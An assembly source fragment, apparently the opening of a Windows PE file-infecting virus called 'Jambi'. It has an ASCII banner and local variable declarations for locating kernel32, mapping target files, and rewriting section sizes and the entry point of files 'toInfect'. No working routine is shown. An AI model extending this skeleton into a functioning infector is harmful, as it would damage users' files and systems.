;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;                     _______           _     _                     ;;;;;;
;;;;;;                    (_______)         | |   (_)                    ;;;;;;
;;;;;;                         _ _____ ____ | |__  _                     ;;;;;;
;;;;;;                     _  | (____ |    \|  _ \| |                    ;;;;;;
;;;;;;                    | |_| / ___ | | | | |_) ) |                    ;;;;;;
;;;;;;                     \___/\_____|_|_|_|____/|_|                    ;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; C'est degueulasse


;; Variables locales
	LOCAL KBaseAddress:DWORD		; Kernel Base Address
	LOCAL hFile:DWORD				; File handler. 
	LOCAL hMap:DWORD				; Mapping handler.
	LOCAL fileSize:DWORD			; Original file size.
	LOCAL dataAddr:DWORD			; Addr of .jambi/.data
	LOCAL dataSize:DWORD			; Size of .jambi/.data
	LOCAL hFind:DWORD				; Used for file listing.
	
	LOCAL peHeaderAddr:DWORD		; PE Header.
	LOCAL IBaseAddress:DWORD		; toInfect Base Address
	LOCAL IImageBase:DWORD			; toInfect ImageBase
	LOCAL ISizeOfHeaders:DWORD		; toInfect size of headers
	LOCAL ISizeOfImage:DWORD		; 
	LOCAL ISizeOfCode:DWORD			; 
	LOCAL ISectionCount:WORD		; toInfect Section Count
	LOCAL ISectionAlignment:DWORD	; SectionAlignment
	LOCAL IFileAlignment:DWORD		; FileAlignment
	LOCAL IEntryPoint:DWORD			; EntryPoint
	LOCAL IEntryPointAddr:DWORD		; EntryPoint address in file
	LOCAL INewEntryPoint:DWORD		; 
	LOCAL lastSectionVSize:DWORD	; Virtual Size
	LOCAL lastSectionVAddr:DWORD	; Virtual Address
	LOCAL lastSectionRSize:DWORD	; Raw Size
	LOCAL lastSectionRAddr:DWORD	; Raw Address
	LOCAL jambiVAddr:DWORD			; Jambi RVA
	LOCAL jambiRAddr:DWORD			; Jambi Raw Address


	LOCAL p_GetModuleHandle:DWORD	; GetModuleHandleA
	;LOCAL wfdata:WIN32_FIND_DATA
	LOCAL nameOfCurrentFile:DWORD